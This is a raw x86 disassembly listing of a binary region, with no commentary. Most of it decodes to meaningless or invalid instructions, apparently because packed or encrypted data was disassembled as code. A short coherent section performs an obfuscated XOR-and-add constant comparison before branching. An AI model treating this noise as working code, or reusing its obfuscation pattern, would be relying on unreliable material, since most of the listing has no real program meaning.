  410183:	shr    edi,cl
  410185:	jmp    0xee2f0089
  41018a:	into   
  41018b:	(bad)  
  41018d:	shr    bl,1
  41018f:	out    0xf,eax
  410191:	fcomp  st(1)
  410193:	jecxz  0x410178
  410195:	cld    
  410196:	std    
  410197:	enter  0xe1b2,0xe2
  41019b:	jmp    0xb4f8:0xcfc8ecae
  4101a2:	in     eax,0xec
  4101a4:	clc    
  4101a5:	mov    ecx,0xb8f0fbf4
  4101aa:	in     eax,dx
  4101ab:	out    0xe6,al
  4101ad:	out    0xfc,eax
  4101af:	shl    eax,1
  4101b1:	out    0xe9,al
  4101b3:	add    ebp,ebx
  4101b5:	in     eax,dx
  4101b6:	retf   0xe9cd
  4101b9:	leave  
  4101ba:	(bad)  
  4101bb:	enter  0xd0d1,0xb7
  4101bf:	(bad)  
  4101c0:	mov    dl,0xe9
  4101c2:	push   DWORD PTR [ebp-0xd43250a]
  4101c8:	jecxz  0x4101b1
  4101ca:	icebp  
  4101cb:	out    0xe6,al
  4101cd:	(bad)
  4101d0:	call   0x40a02c4
  4101d5:	add    ecx,DWORD PTR [eax+edi*4]
  4101d8:	fsub   st(7),st
  4101da:	ret    0xede8
  4101dd:	rol    bh,1
  4101df:	aam    0xe6
  4101e1:	(bad)  
  4101e2:	mov    ebx,0xc3fad8ff
  4101e7:	(bad)  
  4101e9:	(bad)  
  4101ea:	icebp  
  4101eb:	mov    edi,0xd0c3dabc
  4101f0:	or     esi,esp
  4101f2:	(bad)  
  4101f4:	(bad)  
  4101f5:	fsubr  st,st(4)
  4101f7:	mov    ecx,0xcee0c7cb
  4101fc:	scas   al,BYTE PTR es:[edi]
  4101fd:	ret    0xeccb
  410200:	mov    ebx,0xefbac9f4
  410205:	fmul   st,st(4)
  410207:	ret    0xbcc1
  41020a:	in     al,dx
  41020b:	rol    ah,1
  41020d:	(bad)
  410210:	add    bl,bh
  410212:	sti    
  410213:	retf   0xc105
  410216:	(bad)  
  410218:	add    edx,DWORD PTR [ecx+eax*4]
  41021b:	mov    DWORD PTR [ebp-0x10],edx
  41021e:	mov    eax,DWORD PTR [ebp-0x3c]
  410221:	xor    eax,0x75108b5
  410226:	add    eax,0x3272fb
  41022b:	cmp    DWORD PTR [ebp-0x10],eax
  41022e:	je     0x41023e
  410234:	jmp    0x412644
  410239:	jmp    0x412644
  41023e:	mov    eax,DWORD PTR [ebp-0x2c]
  410241:	mov    ecx,DWORD PTR [ebp-0x3c]
  410244:	xor    ecx,0x75108b5
  41024a:	add    ecx,0x3272fb
  410250:	cmp    eax,ecx
  410252:	je     0x4125f9
  410258:	mov    eax,DWORD PTR [ebp-0x44]
  41025b:	mov    ecx,DWORD PTR [ebp-0x24]
  41025e:	movzx  eax,WORD PTR [ecx+eax*2]
  410262:	mov    ecx,DWORD PTR [ebp-0x20]
  410265:	jmp    0x4125ee
  41026a:	push   edi
  41026b:	scas   eax,DWORD PTR es:[edi]
  41026c:	jp     0x410212
  41026e:	bound  esi,QWORD PTR [ebp+esi*2-0x1b035694]
  410275:	xor    BYTE PTR [ecx+edx*1],bl
  410278:	imul   eax,DWORD PTR [edi+0x7b7b48da],0x7b7b98e7
  410282:	jmp    0xc818fa35
  410287:	fucomi st,st(5)
  410289:	mov    al,0xe9
  41028b:	iret   
  41028c:	mov    dh,0xb3
  41028e:	mov    dh,0xed
  410290:	int3   
  410291:	mov    edx,0xe6d8f7db
  410296:	ret    
  410297:	repz in al,0x7
  41029a:	call   0x51a0e99
  41029f:	push   es
  4102a0:	fdivr  QWORD PTR [eax-0x233b1a3d]
  4102a6:	in     al,dx
  4102a7:	enter  0xe0e6,0xf1
  4102ab:	not    esp
  4102ad:	mov    esi,0x3ced2f9
  4102b2:	repz loop 0x410295
  4102b5:	std    
  4102b6:	aad    0xf3
  4102b8:	loop   0x410296
  4102ba:	or     eax,eax
  4102bc:	out    dx,eax
  4102bd:	or     eax,0xd0ee08fb
  4102c2:	in     al,0xaf
  4102c4:	rcl    edi,cl
  4102c6:	hlt    
  4102c7:	in     al,dx
  4102c8:	icebp  
  4102c9:	mov    dh,0xf2
  4102cb:	mov    ch,0xc4
  4102cd:	lock clc 
  4102cf:	hlt    
  4102d0:	ret    
  4102d1:	fcmovnb st,st(3)
  4102d3:	loopne 0x410289
  4102d5:	(bad)  
  4102d7:	add    ebx,ebx
  4102d9:	cmc    
  4102da:	neg    ebp
  4102dc:	(bad)  
  4102dd:	fild   DWORD PTR [edi+eiz*8]
  4102e0:	retf   
  4102e1:	loope  0x4102ba
  4102e3:	loopne 0x4102b4
  4102e5:	jecxz  0x4102c3
  4102e7:	lods   al,BYTE PTR ds:[esi]
  4102e8:	aad    0xb7
  4102ea:	lock out dx,eax
  4102ec:	out    0xda,al
  4102ee:	xlat   BYTE PTR ds:[ebx]
  4102ef:	leave  
  4102f0:	ror    ebp,1
  4102f2:	out    dx,eax
  4102f3:	rcl    ebx,0xff
  4102f6:	loopne 0x4102d8
  4102f8:	fiadd  WORD PTR [edx]
  4102fa:	out    dx,eax
  4102fb:	ffreep st(0)
  4102fd:	cld    
  4102fe:	iret   
  4102ff:	(bad)  
  410300:	dec    edx
  410302:	loope  0x4102e5
  410304:	out    dx,al
  410305:	scas   al,BYTE PTR es:[edi]
  410306:	mov    esp,0xe5edc8b1
  41030b:	iret   
  41030c:	retf   
  41030d:	mov    ah,0xe4
  41030f:	fnstsw WORD PTR [edi-0x52c033f]
  410315:	icebp  
  410316:	(bad)  
  410317:	mov    esp,0xe4f50be5
  41031c:	or     bh,ah
  41031e:	fimul  DWORD PTR [esi]
  410320:	add    ecx,esp
  410322:	lock enter 0xdce0,0xcf
  410327:	aad    0xb6
  410329:	out    dx,al
  41032a:	in     al,dx
  41032b:	(bad)  
  41032c:	(bad)  
  41032d:	mov    ebx,0x3dad5bd
  410332:	rcr    cl,1
  410334:	rol    DWORD PTR [ecx],0xd8
  410337:	or     dl,dl
  410339:	(bad)  
  41033b:	cli    
  41033c:	or     edi,eax
  41033e:	loop   0x410301
  410340:	or     BYTE PTR [esi-0x3f3e1151],ch
  410346:	mov    dh,0xed
  410348:	mov    cl,0xc1
  41034a:	int    0xfa
  41034c:	inc    ebp
  41034e:	fnstenv [ebp+ebp*8-0x1e191706]
  410355:	icebp  
  410356:	shr    edx,0xd6
  410359:	rcl    dh,0xd6
  41035c:	add    ebx,edi
  41035e:	hlt    
  41035f:	jmp    0xf6cf:0xf7ccf10c
  410366:	in     eax,0xce
  410368:	hlt    
  410369:	mov    ch,0xf4
  41036b:	jmp    0x41035b
  41036d:	mov    bl,0xd9
  41036f:	mov    esp,0xf6ffb7ed
  410374:	std    
  410375:	mov    ebp,0x4e3d301
  41037a:	add    ah,ch
  41037c:	out    0xec,eax
  41037e:	repz std 
  410380:	clc    
  410381:	mov    bl,0xb0
  410383:	in     eax,dx
  410384:	jmp    0xedf8:0xb7d0b5cd
  41038b:	leave  
  41038c:	cmc    
  41038d:	(bad)  
  41038e:	mov    dl,0xde
  410390:	fdivp  st(6),st
  410392:	int3   
  410393:	fdiv   DWORD PTR [edx+edx*8-0x7280d0d]
  41039a:	(bad)  
  41039b:	fisttp QWORD PTR [esi]
  41039d:	(bad)  
  41039e:	call   0xf7ed159f
  4103a3:	lods   al,BYTE PTR ds:[esi]
  4103a4:	icebp  
  4103a5:	jmp    0xd226cb6d
  4103aa:	rcl    bl,0xeb
  4103ad:	cld    
  4103ae:	retf   
  4103af:	mov    cl,0xbc
  4103b1:	leave  
  4103b2:	(bad)  
  4103b4:	fdivrp st(2),st
  4103b6:	mov    esp,0xe4d9dbdf
  4103bb:	fdiv   st,st(6)
  4103bd:	fild   WORD PTR [ebx]
  4103bf:	fcomi  st,st(3)
  4103c1:	stos   BYTE PTR es:[edi],al
  4103c2:	mov    eax,0xe1e7d6af
  4103c7:	icebp  
  4103c8:	iret   
  4103c9:	loopne 0x410394
  4103cb:	fidivr WORD PTR [esi-0x42340e14]
  4103d1:	rcl    edx,cl
  4103d3:	hlt    
  4103d4:	cli    
  4103d5:	in     eax,0x1
  4103d7:	jmp    0x4103bf
  4103d9:	fadd   DWORD PTR [edi]
  4103db:	xlat   BYTE PTR ds:[ebx]
  4103dc:	cld    
  4103dd:	aad    0xdb
  4103df:	jmp    0x4103eb
  4103e1:	(bad)
  4103e4:	ffree  st(6)
  4103e6:	jmp    0x4103aa
  4103e8:	mov    al,0xba
  4103ea:	clc    
  4103eb:	xlat   BYTE PTR ds:[ebx]
  4103ec:	mov    esi,0xcadcf4ef
  4103f1:	into   
  4103f2:	ret    
  4103f3:	inc    ecx
  4103f5:	fiadd  WORD PTR [esi]
  4103f7:	repnz pop es
  4103f9:	add    dl,ah
  4103fb:	loope  0x4103d6
  4103fd:	inc    DWORD PTR [eax]
  4103ff:	add    eax,0xc4dfacc8
  410404:	shl    ah,1
  410406:	(bad)  
  410407:	mov    cl,0xc4
  410409:	jmp    0xfece:0xf0accfb5
  410410:	int3   
  410411:	fild   WORD PTR [ecx]
  410413:	(bad)  
  410414:	sar    BYTE PTR [edi-0x303082d],1
  41041a:	cld    
  41041b:	(bad)  
  41041c:	std    
  41041d:	push   cs
  41041e:	out    0xd9,eax
  410420:	jecxz  0x4103ec
  410422:	(bad)  
  410423:	shr    dl,cl
  410425:	hlt    
  410426:	cmc    
  410427:	int    0xd7
  410429:	idiv   BYTE PTR [ecx-0x3631040a]
  41042f:	out    dx,eax
  410430:	xlat   BYTE PTR ds:[ebx]
  410431:	mov    edx,0x3cdccce
  410436:	fabs   
  410438:	add    dh,al
  41043a:	fincstp 
  41043c:	sti    
  41043d:	jmp    0xf0d0:0xc601fb08
  410444:	scas   eax,DWORD PTR es:[edi]
  410445:	out    dx,al
  410446:	jmp    0x41043d
  410448:	test   dl,0xe0
  41044b:	retf   0xd8db
  41044e:	aad    0xf1
  410450:	cmc    
  410451:	loop   0x410451
  410453:	add    edx,esp
  410455:	in     eax,0xd3
  410457:	shl    dl,0xc2
  41045a:	ret    0xee0a
  41045d:	cli    
  41045e:	out    dx,al
  41045f:	call   0xca2ec975
  410464:	mov    al,0xb0
  410466:	leave  
  410467:	ret    0xd9d0
  41046a:	out    dx,al
  41046b:	(bad)  
  41046c:	fidiv  WORD PTR [esi-0x11450f30]
  410472:	call   0xc223b939
  410477:	sar    BYTE PTR [eax-0x18fd373d],1
  41047d:	into   
  41047e:	(bad)  
  410480:	int3   
  410481:	(bad)  
  410482:	icebp  
  410483:	iret   
  410484:	lock mov bh,0xdc
  410487:	(bad)
  41048a:	(bad)  
  41048b:	enter  0xebd2,0xd7
  41048f:	mov    esi,0xf0e0e2ea
  410494:	(bad)  
  410496:	mov    BYTE PTR [ebx],0xc3
  410499:	(bad)  
  41049a:	retf   
  41049b:	(bad)  
  41049c:	aad    0x5
  41049e:	loope  0x41049e
  4104a0:	enter  0xaddf,0xe8
  4104a4:	out    dx,eax
  4104a5:	enter  0xf7bc,0xd1
  4104a9:	rcr    cl,cl
  4104ab:	in     eax,dx
  4104ac:	jmp    0xce1f047f
  4104b1:	loop   0x410469
  4104b3:	in     al,dx
  4104b4:	(bad)  
  4104b6:	jmp    0x4104af
  4104b8:	add    al,0xeb
  4104ba:	add    edi,esp
  4104bc:	neg    ch
  4104be:	retf   0xebd8
  4104c1:	ret    
  4104c2:	shr    DWORD PTR [ecx+ecx*8-0x10080f1c],0xf8
  4104ca:	stc    
  4104cb:	jmp    0xcdf2:0xf9d6f8be
  4104d2:	repz mov ebp,0x307c5dc
  4104d8:	out    0x2,eax
  4104da:	in     al,0xf6
  4104dc:	(bad)  
  4104dd:	retf   
  4104de:	fldl2e 
  4104e0:	or     dh,cl
  4104e2:	lods   eax,DWORD PTR ds:[esi]
  4104e3:	mul    ebp
  4104e5:	ror    esp,0xea
  4104e8:	rcl    bl,1
  4104ea:	(bad)  
  4104eb:	jmp    0x4104c5
  4104ed:	bnd jmp 0x4104ae
  4104f0:	add    dl,al
  4104f2:	fdiv   QWORD PTR [ebp-0x2e192f33]
  4104f8:	(bad)  
  4104fa:	loope  0x4104c6
  4104fc:	or     eax,esi
  4104fe:	out    dx,eax
  4104ff:	out    dx,eax
  410500:	stc    
  410501:	fxam   
  410503:	shl    BYTE PTR [edx-0x2c1d1049],1
  410509:	out    dx,eax
  41050a:	out    dx,eax
  41050b:	retf   0xddf3
  41050e:	jmp    0x7e3:0xfcdcc9f3
  410515:	add    eax,0xf1dcf4e6
  41051a:	fimul  WORD PTR [ebx]
  41051c:	add    eax,0xef0edcc3
  410521:	scas   eax,DWORD PTR es:[edi]
  410522:	out    dx,al
  410523:	repz (bad) 
  410525:	aad    0xf0
  410527:	test   eax,0xd3cde4c6
  41052c:	mov    edx,0xf3ccf5b3
  410531:	repz clc 
  410533:	add    bh,BYTE PTR [esi-0x473a0402]
  410539:	fchs   
  41053b:	cld    
  41053c:	add    dh,al
  41053e:	retf   
  41053f:	jmp    0xb2b7:0xbfacade9
  410546:	(bad)  
  410547:	hlt    
  410548:	cli    
  410549:	into   
  41054a:	(bad)  
  41054b:	lock mov eax,0xf1f3bdcf
  410551:	enter  0xd3fe,0xf8
  410555:	repnz mov edx,0xfcd8d201
  41055b:	out    0xed,al
  41055d:	aam    0xec
  41055f:	jmp    edx
  410561:	shr    BYTE PTR [esi+ebp*8-0x170f3036],cl
  410568:	mov    ebx,0xdbb8aee8
  41056d:	lds    eax,FWORD PTR [ebx]
  41056f:	hlt    
  410570:	xlat   BYTE PTR ds:[ebx]
  410571:	lock call 0xbd42cc2f
  410577:	rcr    dl,cl
  410579:	aad    0xea
  41057b:	add    al,0xd
  41057d:	hlt    
  41057e:	fcmovne st,st(4)
  410580:	pop    es
  410581:	jmp    0xbd32e64f
  410586:	mov    cl,0xe5
  410588:	(bad)
  41058b:	int    0xe4
  41058d:	fmul   st(7),st
  41058f:	fcmovu st,st(2)
  410591:	fdivr  st(7),st
  410593:	iret   
  410594:	cli    
  410595:	fsubrp st(6),st
  410597:	ret    
  410598:	fcmovb st,st(0)
  41059a:	push   es
  41059b:	(bad)  
  41059c:	test   bl,0x13
  41059f:	push   es
  4105a0:	icebp  
  4105a1:	in     eax,dx
  4105a2:	retf   0xcdce
  4105a5:	retf   0xf7e1
  4105a8:	leave  
  4105a9:	icebp  
  4105aa:	iret   
  4105ab:	mov    dh,0xda
  4105ae:	rol    BYTE PTR [ebx],1
  4105b0:	repnz out dx,eax
  4105b2:	(bad)  
  4105b3:	idiv   dh
  4105b5:	fnstsw WORD PTR [ecx+edx*8-0x30220322]
  4105bc:	test   BYTE PTR [esi],0xcd
  4105bf:	repnz add dh,dl
  4105c2:	ror    ch,1
  4105c4:	(bad)
  4105c9:	sar    BYTE PTR [ecx-0xa0c0d19],0xfa
  4105d0:	(bad)  
  4105d2:	(bad)  
  4105d4:	out    0xe6,al
  4105d6:	(bad)  
  4105d7:	(bad)  
  4105d8:	jecxz  0x4105e1
  4105da:	retf   
  4105db:	hlt    
  4105dc:	std    
  4105dd:	std    
  4105de:	or     eax,ebx
  4105e0:	iret   
  4105e1:	les    ebp,FWORD PTR [edx-0x18544853]
  4105e7:	ret    
  4105e8:	mov    edx,0xd2dbd4d8
  4105ed:	in     eax,0xed
  4105ef:	fcmovne st,st(4)
  4105f1:	mov    bh,0xf3
  4105f3:	aad    0xce
  4105f5:	loopne 0x4105cc
  4105f7:	rol    cl,0xcb
  4105fa:	(bad)  
  4105fb:	jmp    0xb15f20e
  410600:	leave  
  410601:	mov    ebp,0xaed1ead1
  410606:	aad    0xe7
  410608:	aad    0xce
  41060a:	inc    ebp
  41060c:	cli    
  41060d:	xlat   BYTE PTR ds:[ebx]
  41060e:	inc    DWORD PTR [ebx]
  410610:	sti    
  410611:	rcl    esp,cl
  410613:	add    DWORD PTR [eax],eax
  410615:	add    DWORD PTR [esi-0x1535012c],edi
  41061b:	push   es
  41061c:	aam    0xfa
  41061e:	lds    eax,FWORD PTR [esi]
  410620:	loop   0x4105d0
  410622:	mov    esp,0xcfcdefd7
  410627:	(bad)  
  410628:	in     al,0xc4
  41062a:	clc    
  41062b:	bnd jmp 0x410609
  41062e:	iret   
  41062f:	fsubr  st,st(2)
  410631:	loopne 0x410606
  410633:	rol    DWORD PTR [edi],1
  410635:	inc    ebp
  410637:	push   es
  410638:	rol    al,cl
  41063a:	call   0xec4c0306
  41063f:	push   cs
  410640:	add    ebx,esp
  410642:	scas   eax,DWORD PTR es:[edi]
  410643:	leave  
  410644:	mov    esp,0xbab1cbb7
  410649:	repnz mov bh,0xef
  41064c:	hlt    
  41064d:	jmp    0x410617
  41064f:	fstp   st(3)
  410651:	rcl    cl,cl
  410653:	xlat   BYTE PTR ds:[ebx]
  410654:	cli    
  410655:	ret    
  410656:	in     al,0xf3
  410658:	ret    0x3dc
  41065b:	fld    QWORD PTR [esi]
  41065d:	fdivr  st,st(7)
  41065f:	add    ebp,esp
  410661:	mov    edi,0xc3e7a5f1
  410666:	icebp  
  410667:	cmc    
  410668:	int    0xbb
  41066a:	fucomip st,st(2)
  41066c:	cmc    
  41066d:	mov    edi,0xf201d0cb
  410672:	out    dx,al
  410673:	mov    ch,0xf2
  410675:	add    dh,ah
  410677:	aad    0xe3
  410679:	add    ebp,edx
  41067b:	sysret 
  41067d:	jmp    0xa8c6:0xf3efefef
  410684:	scas   eax,DWORD PTR es:[edi]
  410685:	aad    0xf7
  410687:	lods   al,BYTE PTR ds:[esi]
  410688:	loope  0x410674
  41068a:	sar    BYTE PTR [eax-0xb144a16],0xb9
  410691:	repnz mov ebp,0x4f002e7
  410697:	dec    BYTE PTR [edx]
  410699:	std    
  41069a:	fucom  st(1)
  41069c:	rcr    dl,0xd4
  41069f:	or     ecx,ebx
  4106a1:	mov    eax,0xebedaec2
  4106a6:	jmp    0xea28be78
  4106ab:	mov    edi,0xeebbd8df
  4106b0:	into   
  4106b1:	fld    st(2)
  4106b3:	(bad)  
  4106b4:	loopne 0x41068f
  4106b6:	sar    al,1
  4106b8:	jecxz  0x41067e
  4106ba:	leave  
  4106bb:	add    ch,al
  4106bd:	jmp    0xdc50d2bb
  4106c2:	stos   BYTE PTR es:[edi],al
  4106c3:	ret    0xcacb
  4106c6:	mov    dl,0xc8
  4106c8:	enter  0xceef,0xf7
  4106cc:	repz mov edi,0xc2bfe2d0
  4106d2:	add    bh,bl
  4106d4:	repz mov ebx,0xe1c1e2ff
  4106da:	clc    
  4106db:	add    al,0xe9
  4106dd:	paddusw mm1,QWORD PTR [edx+ecx*1]
  4106e1:	rol    esp,cl
  4106e3:	(bad)  
  4106e4:	jmp    0xd9cb:0xfad2d0e7
  4106eb:	jmp    0xd93fd6b9
  4106f0:	mov    esi,0x6dfdbed
  4106f5:	push   esp
  4106f7:	lock fucom st(2)
  4106fa:	jmp    0x4106c3
  4106fc:	cmc    
  4106fd:	fmul   QWORD PTR [edi]
  4106ff:	dec    DWORD PTR ds:0xd7cae1cb
  410705:	shl    esp,1
  410707:	out    dx,al
  410708:	jmp    0xde3901f7
  41070d:	fmul   st(1),st
  41070f:	icebp  
  410710:	out    dx,al
  410711:	lock fcmovb st,st(3)
  410714:	sti    
  410715:	add    edi,ecx
  410717:	aad    0xf0
  410719:	jmp    0xe609d2fe
  41071e:	jecxz  0x4106f8
  410720:	push   cs
  410721:	out    dx,eax
  410722:	out    dx,eax
  410723:	mov    bh,0xf0
  410725:	vcmppd ymm6,ymm6,YMMWORD PTR [ebp-0x4a37482f],0xe9
  41072f:	repnz shl ecx,cl
  410732:	lock cli 
  410734:	repnz push es
  410736:	add    esi,esp
  410738:	mov    esp,0xd6d5c0f1
  41073d:	in     al,dx
  41073e:	frndint 
  410740:	into   
  410741:	int3   
  410742:	(bad)  
  410743:	leave  
  410744:	fucom  st(4)
  410746:	mov    ch,0xd2
  410748:	out    dx,eax
  410749:	scas   eax,DWORD PTR es:[edi]
  41074a:	repnz cmc 
  41074c:	aad    0xdc
  41074e:	mov    ecx,0xdfd3c9b1
  410753:	mov    eax,0xeafbf5fd
  410758:	in     eax,0xc2
  41075a:	lock mov BYTE PTR [eax],0xa
  41075e:	into   
  41075f:	loop   0x410767
  410761:	lods   al,BYTE PTR ds:[esi]
  410762:	mov    eax,0xcbbcd6ae
  410768:	(bad)  
  410769:	out    dx,al
  41076a:	mov    ah,0xfb
  41076c:	lock cmc 
  41076e:	clc    
  41076f:	out    dx,eax
  410770:	fsubr  st,st(4)
  410772:	mov    esp,0xe5e4b8de
  410777:	stc    
  410778:	div    ah
  41077a:	ret    0xc7f8
  41077d:	aad    0xda
  41077f:	std    
  410780:	or     eax,esi
  410782:	mov    esp,0xb4eab6ee
  410787:	loop   0x41077d
  410789:	(bad)
  41078c:	std    
  41078d:	fcmovbe st,st(0)
  41078f:	icebp  
  410790:	mov    ecx,0xfbfad6d5
  410795:	int3   
  410796:	aad    0xc7
  410798:	(bad)  
  41079a:	enter  0xc7f6,0x1
  41079e:	add    esi,ecx
  4107a0:	push   cs
  4107a1:	shl    bl,0xf2
  4107a4:	shl    eax,1
  4107a6:	mov    dl,0xcb
  4107a8:	aam    0xb6
  4107aa:	fxch   st(3)
  4107ac:	(bad)  
  4107ae:	idiv   ch
  4107b0:	icebp  
  4107b1:	in     eax,dx
  4107b2:	(bad)  
  4107b4:	aad    0xed
  4107b6:	mov    edx,0x801cad8
  4107bb:	cmc    
  4107bc:	hlt    
  4107bd:	out    dx,eax
  4107be:	int    0xd9
  4107c0:	or     ebx,ecx
  4107c2:	shl    cl,0xb7
  4107c5:	(bad)  
  4107c6:	retf   
  4107c7:	shl    BYTE PTR [edx-0x15151808],1
  4107cd:	mov    bh,0xbc
  4107cf:	retf   0xf5f7
  4107d2:	sar    DWORD PTR [eax-0x2d00391d],cl
  4107d8:	ret    0xdc07
  4107db:	mov    ebp,0xd8c8dbcb
  4107e0:	fmul   st,st(7)
  4107e2:	mov    cl,0xbd
  4107e4:	repz repz repnz cli 
  4107e8:	leave  
  4107e9:	mov    ch,0xf4
  4107eb:	fdivrp st(3),st
  4107ed:	mov    dh,0xf0
  4107ef:	std    
  4107f0:	clc    
  4107f1:	iret   
  4107f2:	jecxz  0x4107cd
  4107f4:	mov    esi,0xfcd000d5
  4107f9:	jecxz  0x41080a
  4107fb:	add    eax,0x121303db
  410800:	repz shr bl,cl
  410803:	(bad)  
  410804:	loop   0x4107f9
  410806:	out    0xcf,al
  410808:	in     eax,dx
  410809:	stc    
  41080a:	clc    
  41080b:	fnstenv [ebp-0xe45210e]
  410811:	ret    0xc7bd
  410814:	ret    0x2c5
  410817:	sti    
  410818:	in     al,0xfb
  41081a:	aad    0xf5
  41081c:	std    
  41081d:	hlt    
  41081e:	or     ebx,esi
  410820:	in     al,0xe7
  410822:	fidiv  WORD PTR [ebx-0x1c350f3b]
  410828:	sar    dl,cl
  41082a:	out    dx,eax
  41082b:	retf   
  41082c:	mov    ecx,0xeaf0efdd
  410831:	fdivrp st(7),st
  410833:	rcl    edx,1
  410835:	shl    eax,cl
  410837:	fdivrp st(7),st
  410839:	retf   
  41083a:	in     eax,0xfe
  41083c:	std    
  41083d:	std    
  41083e:	add    al,BYTE PTR [edx]
  410840:	add    eax,0xcfe5ebdd
  410845:	stos   DWORD PTR es:[edi],eax
  410846:	aam    0xd2
  410848:	mov    dl,0xf5
  41084a:	sar    dh,cl
  41084c:	fst    st(2)
  41084e:	mov    edi,0xdceefeb9
  410853:	loop   0x410828
  410855:	shl    ebp,cl
  410857:	fild   WORD PTR [ebx]
  410859:	(bad)  
  41085b:	fsubp  st(5),st
  41085d:	or     ah,dh
  41085f:	(bad)  
  410861:	test   al,0xb8
  410863:	shr    ah,cl
  410865:	scas   al,BYTE PTR es:[edi]
  410866:	rcl    edi,1
  410868:	xlat   BYTE PTR ds:[ebx]
  410869:	lock mov ebx,0xccd6f4b8
  41086f:	test   esi,0xfdbdd1bc
  410875:	fstp   TBYTE PTR [edi+edi*8+0x1dce1f2]
  41087c:	stc    
  41087d:	jecxz  0x41085f
  41087f:	rcl    edx,0xc3
  410882:	call   0xf3fef938
  410887:	out    dx,eax
  410888:	iret   
  410889:	mov    ch,0xcf
  41088b:	mov    bh,0xcd
  41088d:	cld    
  41088e:	call   0x11fe750
  410893:	hlt    
  410894:	(bad)  
  410895:	jecxz  0x410887
  410897:	mov    ecx,0x40a08dd
  41089c:	stc    
  41089d:	jmp    esp
  41089f:	sti    
  4108a0:	fucomp st(4)
  4108a2:	int3   
  4108a3:	xlat   BYTE PTR ds:[ebx]
  4108a4:	jmp    0xf505de9c
  4108a9:	in     al,dx
  4108aa:	jmp    0xf43aeda7
  4108af:	(bad)  
  4108b1:	stc    
  4108b2:	mov    edi,0xc304ddf7
  4108b7:	mov    ecx,0xe407c203
  4108bc:	push   cs
  4108bd:	into   
  4108be:	jmp    0xb320119d
  4108c3:	in     al,dx
  4108c4:	mov    ebp,0xf2d5c3e6
  4108c9:	in     al,dx
  4108ca:	into   
  4108cb:	fcmovbe st,st(5)
  4108cd:	(bad)  
  4108ce:	idiv   BYTE PTR [edx-0x2bfc2bfd]
  4108d4:	in     eax,0xc1
  4108d6:	add    eax,0xdcfab8f6
  4108db:	call   0xee06e8e8
  4108e0:	adc    edx,ecx
  4108e2:	loope  0x4108b5
  4108e4:	(bad)  
  4108e6:	xlat   BYTE PTR ds:[ebx]
  4108e7:	jmp    0xcef904c1
  4108ec:	xlat   BYTE PTR ds:[ebx]
  4108ed:	mov    dh,0xca
  4108ef:	clc    
  4108f0:	into   
  4108f1:	fcomip st,st(7)
  4108f3:	add    esp,edx
  4108f5:	ret    0xfa04
  4108f8:	icebp  
  4108f9:	jmp    0xe5c4:0xdf0209
  410900:	std    
  410901:	(bad)  
  410902:	mov    al,0xdc
  410904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410905:	mov    esp,0xb3cdc9f4
  41090a:	out    dx,al
  41090b:	int    0xbb
  41090d:	in     al,dx
  41090e:	in     al,dx
  41090f:	aam    0xdc
  410911:	cli    
  410912:	cld    
  410913:	shl    eax,0xbe
  410916:	(bad)  
  410918:	aad    0xc0
  41091a:	add    bh,al
  41091c:	leave  
  41091d:	out    0xce,eax
  41091f:	fadd   DWORD PTR [eax]
  410921:	mov    esp,0xb6c1e6ac
  410926:	leave  
  410927:	out    dx,eax
  410928:	loop   0x4108dc
  41092a:	mov    ecx,0xd6b5e4e8
  41092f:	stc    
  410930:	fcmovnbe st,st(5)
  410932:	rcl    edx,0xd9
  410935:	sar    ebx,1
  410937:	(bad)  
  410938:	in     eax,0xdb
  41093a:	fstp   st(6)
  41093c:	fsubr  st(0),st
  41093e:	push   es
  41093f:	leave  
  410940:	int    0xd3
  410942:	loope  0x410911
  410944:	shl    BYTE PTR [ecx-0x3124300e],1
  41094a:	jmp    0xecf0:0xd9d1d6ba
  410951:	aad    0xf1
  410953:	lock add esp,ecx
  410956:	lock in al,0xdd
  410959:	add    bh,BYTE PTR [esi-0x11ff231a]
  41095f:	retf   
  410960:	btr    ebx,esi
  410963:	mov    esi,0xe0e8abd6
  410968:	ret    0xe9d0
  41096b:	call   0xf3f7f356
  410970:	fdiv   st,st(2)
  410972:	clc    
  410973:	(bad)  
  410975:	jecxz  0x410957
  410977:	ffree  st(6)
  410979:	(bad)  
  41097a:	hlt    
  41097b:	(bad)  
  41097d:	int    0x13
  41097f:	in     al,0xff
  410981:	int    0xc2
  410983:	ret    0xd5d7
  410986:	sti    
  410987:	repz in eax,0xc5
  41098a:	in     eax,dx
  41098b:	ror    ch,1
  41098d:	mov    edx,0xecd3f1ef
  410992:	call   0x40f86a
  410997:	fcmovnbe st,st(4)
  410999:	(bad)  
  41099b:	aam    0xe5
  41099d:	les    edx,FWORD PTR [ebx]
  41099f:	sti    
  4109a0:	in     eax,dx
  4109a1:	call   0xed280085
  4109a6:	into   
  4109a7:	in     eax,0xf0
  4109a9:	mov    bh,0xca
  4109ab:	vpmulhuw ymm3,ymm4,ymm0
  4109af:	mov    ah,0xbc
  4109b1:	std    
  4109b2:	repnz in al,dx
  4109b4:	std    
  4109b5:	repnz shl al,1
  4109b8:	clc    
  4109b9:	jmp    0x410994
  4109bb:	sti    
  4109bc:	stc    
  4109bd:	std    
  4109be:	in     eax,0xee
  4109c0:	stc    
  4109c1:	fsubrp st(0),st
  4109c3:	jmp    0x4109a6
  4109c5:	mov    ebp,0xe4d7e5c0
  4109ca:	fcomi  st,st(2)
  4109cc:	sti    
  4109cd:	mov    bh,0xc4
  4109cf:	fcomip st,st(3)
  4109d1:	ror    al,1
  4109d3:	add    ah,bl
  4109d5:	jecxz  0x4109dc
  4109d7:	xlat   BYTE PTR ds:[ebx]
  4109d8:	aad    0xd1
  4109da:	out    0xc0,al
  4109dc:	leave  
  4109dd:	aam    0xc9
  4109df:	add    ebx,esp
  4109e1:	lods   eax,DWORD PTR ds:[esi]
  4109e2:	loop   0x4109aa
  4109e4:	shr    cl,cl
  4109e6:	ret    0xe1e8
  4109e9:	div    DWORD PTR [esi-0x280f1138]
  4109ef:	retf   0xfaee
  4109f2:	mov    eax,0xd700c2f7
  4109f7:	xlat   BYTE PTR ds:[ebx]
  4109f8:	or     ebx,esp
  4109fa:	rcr    al,0xed
  4109fd:	out    0xf4,al
  4109ff:	int3   
  410a00:	fsub   st,st(4)
  410a02:	xlat   BYTE PTR ds:[ebx]
  410a03:	(bad)
  410a06:	jecxz  0x4109bc
  410a08:	out    0xb7,eax
  410a0a:	retf   
  410a0b:	cmc    
  410a0c:	aad    0xf8
  410a0e:	icebp  
  410a0f:	shl    ebx,cl
  410a11:	add    ch,ch
  410a13:	add    ebx,ebx
  410a15:	mov    ebx,0xe4bc0605
  410a1a:	cli    
  410a1b:	add    esi,eax
  410a1d:	jecxz  0x410a05
